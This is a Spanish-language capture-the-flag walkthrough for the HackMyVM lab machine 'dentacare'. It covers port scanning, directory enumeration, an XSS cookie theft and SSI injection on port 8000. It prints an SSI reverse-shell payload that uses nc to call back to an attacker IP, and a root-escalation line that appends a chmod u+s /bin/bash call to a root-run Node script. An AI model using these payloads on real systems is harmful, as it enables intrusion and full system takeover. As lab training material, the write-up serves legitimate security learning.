+++
title = 'dentacare - HackMyVM'
+++

[link => dentacare](https://downloads.hackmyvm.eu/dentacare.zip)

---

## Escaneo de red con nmap para descubrir máquina objetivo

```bash
nmap -sn 10.38.1.0/24
```

![nmap host discovery](/images/dentacarehackmyvm/nmaphd.png)

### La IP de la máquina objetivo es **10.38.1.11**

## Escaneo de la máquina objetivo en busca de puertos abiertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.38.1.11 -oN targetscan
```

```txt
───────┬──────────────────────────────────────────────────────────────────────────────────────────────
       │ File: targetscan
───────┼──────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Tue Feb 18 14:34:59 2025 as: /usr/lib/nmap/nmap -p- --open -sS 
       │ --min-rate 5000 -vvv -n -Pn -oN targetscan 10.38.1.11
   2   │ Nmap scan report for 10.38.1.11
   3   │ Host is up, received arp-response (0.0011s latency).
   4   │ Scanned at 2025-02-18 14:34:59 EST for 4s
   5   │ Not shown: 65532 closed tcp ports (reset)
   6   │ PORT     STATE SERVICE  REASON
   7   │ 22/tcp   open  ssh      syn-ack ttl 64
   8   │ 80/tcp   open  http     syn-ack ttl 64
   9   │ 8000/tcp open  http-alt syn-ack ttl 64
  10   │ MAC Address: 08:00:27:7E:C8:CC (Oracle VirtualBox virtual NIC)
  11   │ 
  12   │ Read data files from: /usr/share/nmap
  13   │ # Nmap done at Tue Feb 18 14:35:03 2025 -- 1 IP address (1 host up) scanned in 4.43 seconds
───────┴──────────────────────────────────────────────────────────────────────────────────────────────
```

### **Puertos Abiertos: 22,80,8000**

## Ejecución de scripts de nmap

```bash
sudo nmap -sCV -p22,80,8000 10.38.1.11 -oN scriptsexec
```

```txt
# Nmap 7.94SVN scan initiated Tue Feb 18 14:39:52 2025 as: /usr/lib/nmap/nmap -sCV -p22,80,8000 -oN scriptsexec 10.38.1.11
Nmap scan report for 10.38.1.11
Host is up (0.00078s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 (ECDSA)
|_  256 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 (ED25519)
80/tcp   open  http    Werkzeug/3.0.2 Python/3.11.2
|_http-server-header: Werkzeug/3.0.2 Python/3.11.2
|_http-title: DentaCare Corporation
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.2 Python/3.11.2
|     Date: Tue, 18 Feb 2025 19:39:59 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 43069
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <title>DentaCare Corporation</title>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,500,600,700" rel="stylesheet">
|     <link rel="stylesheet" href="../static/css/open-iconic-bootstrap.min.css">
|     <link rel="stylesheet" href="../static/css/animate.css">
|     <link rel="stylesheet" href="../static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="../static/css/owl.theme.default.min.css">
|     <link rel="stylesheet" href="../static/css/magnific-popup.css">
|     <link rel="stylesheet" href="../static/css/aos.css">
|     <lin
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.2 Python/3.11.2
|     Date: Tue, 18 Feb 2025 19:39:59 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
8000/tcp open  http    Apache httpd 2.4.57
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.57 (Debian)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=2/18%Time=67B4E20F%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,1CF8,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.2\x
SF:20Python/3\.11\.2\r\nDate:\x20Tue,\x2018\x20Feb\x202025\x2019:39:59\x20
SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
SF:x2043069\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20la
SF:ng=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<title>DentaCare\x20Corpora
SF:tion</title>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20
SF:\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20init
SF:ial-scale=1,\x20shrink-to-fit=no\">\n\x20\x20\x20\x20<link\x20href=\"ht
SF:tps://fonts\.googleapis\.com/css\?family=Open\+Sans:300,400,500,600,700
SF:\"\x20rel=\"stylesheet\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\
SF:x20href=\"\.\./static/css/open-iconic-bootstrap\.min\.css\">\n\x20\x20\
SF:x20\x20<link\x20rel=\"stylesheet\"\x20href=\"\.\./static/css/animate\.c
SF:ss\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"\.\./stati
SF:c/css/owl\.carousel\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"styles
SF:heet\"\x20href=\"\.\./static/css/owl\.theme\.default\.min\.css\">\n\x20
SF:\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"\.\./static/css/magni
SF:fic-popup\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=
SF:\"\.\./static/css/aos\.css\">\n\x20\x20\x20\x20<lin")%r(HTTPOptions,C7,
SF:"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.2\x20Python/3\.11\
SF:.2\r\nDate:\x20Tue,\x2018\x20Feb\x202025\x2019:39:59\x20GMT\r\nContent-
SF:Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20HEAD,\x20GET,\x20OPTI
SF:ONS\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(RTSPReq
SF:uest,16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<h
SF:ead>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\
SF:x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x
SF:20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\
SF:x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20<p>Error\x20code\x20explanation:\x20400\x20-\x20Bad\x20request
SF:\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body
SF:>\n</html>\n");
MAC Address: 08:00:27:7E:C8:CC (Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 18 14:41:21 2025 -- 1 IP address (1 host up) scanned in 89.11 seconds
```

## Enumeración de directorios con gobuster 

```bash
gobuster dir -u http://10.38.1.11/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
```

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.38.1.11/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 200) [Size: 23021]
/about                (Status: 200) [Size: 22975]
/contact              (Status: 500) [Size: 27322]
/services             (Status: 200) [Size: 21296]
/admin                (Status: 302) [Size: 189] [--> /]
/comment              (Status: 405) [Size: 153]
/console              (Status: 200) [Size: 1563]
/doctors              (Status: 200) [Size: 24697]

===============================================================
Finished
===============================================================
```

## Campo de feedback vulnerable a xss

![xss payload](/images/dentacarehackmyvm/xsspayload.png)

![cookie](/images/dentacarehackmyvm/cookie.png)

![jwt token](/images/dentacarehackmyvm/jwttoken.png)

## Agregar dominio al archivo hosts

```txt
10.38.1.11      dentacare.hmv
```

## Acceso a servidor Apache en puerto 8000 con la cookie obtenida

![Cookie Access](/images/dentacarehackmyvm/accessapache.png)


## Extensión shtml (SSI)

[Server-Side Includes (SSI) Injection](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)

[Server Side Inclusion/Edge Side Inclusion Injection](https://book.hacktricks.wiki/en/pentesting-web/server-side-inclusion-edge-side-inclusion-injection.html)

![File extension shtml](/images/dentacarehackmyvm/filext.png)

```bash
=====================
payload de hacktricks
=====================

// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc 10.38.1.10 4444 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
```

## Tratamiento de la tty

```bash
script /dev/null -c /bin/bash
[ctrl+z]
stty raw -echo; fg
reset xterm
export SHELL=/bin/bash
export TERM=xterm
stty rows <num of rows> columns <num of columns>
```

## Escalada de privilegios

```bash
www-data@dentacare:/home$ ls -la
total 12
drwxr-xr-x  3 root    root    4096 Apr 12  2024 .
drwxr-xr-x 18 root    root    4096 Mar  9  2024 ..
drwx------  4 dentist dentist 4096 Apr 12  2024 dentist

www-data@dentacare:/home$ find / -group dentist -ls 2>/dev/null
  1048931      4 drwxr-xr-x   3 dentist  dentist      4096 Apr 12  2024 /opt/carries
  1048539      4 -rw-------   1 dentist  dentist       357 Apr 12  2024 /opt/carries/potion.txt
  1048265      4 -rwxr--r--   1 dentist  dentist      1122 Apr 12  2024 /opt/carries/crypted_potion.txt
  1048932      4 -rwxr-xr-x   1 dentist  dentist       923 Apr 12  2024 /opt/carries/farewell_the_carries.py
  1046534      4 drwx------   4 dentist  dentist      4096 Apr 12  2024 /home/dentist
```

### Monitoreo de tareas en segundo plano con pspy

[pspy](https://github.com/DominicBreuker/pspy)

```bash
2025/02/19 00:40:02 CMD: UID=0     PID=48085  | /usr/bin/node /opt/appli/.config/read_comment.js 
```
El archivo read_comment.js tiene permisos de escritura

```bash
www-data@dentacare:/opt/appli/.config$ ls -la
total 12
drwxr-xr-x 2 www-data www-data 4096 Apr 12  2024 .
drwxr-xr-x 7 www-data www-data 4096 Feb 19 00:30 ..
-rw-r--r-- 1 www-data www-data 1063 Apr 12  2024 read_comment.js
```

```txt
============
Si el binario tiene el bit SUID establecido puedo escalar privilegios
============

require('child_process').exec('chmod u+s /bin/bash')
```

Agregar al final del archivo y esperar su ejecución

```bash
www-data@dentacare:/opt/appli/.config$ cat read_comment.js 
const puppeteer = require('puppeteer');

(async () => {
    const browser = await puppeteer.launch({
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    const page = await browser.newPage();

    const cookies = [{
        'name': 'Authorization',
        'value': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJEZW50YUNhcmUgQ29ycG9yYXRpb24gIiwiaWF0IjoxNzEyNTc0NTEyLCJleHAiOjE3NDQxMTA1MTIsImF1ZCI6ImRlbnRhY2FyZS5obXYiLCJzdWIiOiJoZWxwZGVza0BkZW50YWNhcmUuaG12IiwiR2l2ZW5OYW1lIjoiUGF0cmljayIsIlN1cm5hbWUiOiJQZXRpdCIsIkVtYWlsIjoiYWRtaW5AZGVudGFjYXJlLmhtdiIsIlJvbGUiOlsiQWRtaW5pc3RyYXRvciIsIlByb2plY3QgQWRtaW5pc3RyYXRvciJdfQ.FIMxmUCOL3a4ThN5z-7VDN8OxBK7W0krHlcVktAiZtx3KXSQsbno1q1MRUL9JMPTJeqoTr-bRL2KWyr5Kv7JnQ',
        'url': 'http://localhost:80'
    }];

    await page.setCookie(...cookies);

    await page.goto('http://localhost:80/view-all-comments');

    console.log(`Page visitée avec cookie spécifié à ${new Date().toISOString()}`);

    await page.waitForTimeout(10000);

    await browser.close();
})();

require('child_process').exec('chmod u+s /bin/bash')
```

```bash
www-data@dentacare:/opt/appli/.config$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash
```

### Flag de usuario root 

```bash
www-data@dentacare:/opt/appli/.config$ /bin/bash -p
bash-5.2# whoami
root
bash-5.2# cd /root
bash-5.2# ls
r00t.txt
bash-5.2# cat r00t.txt 
31b80***************************
```
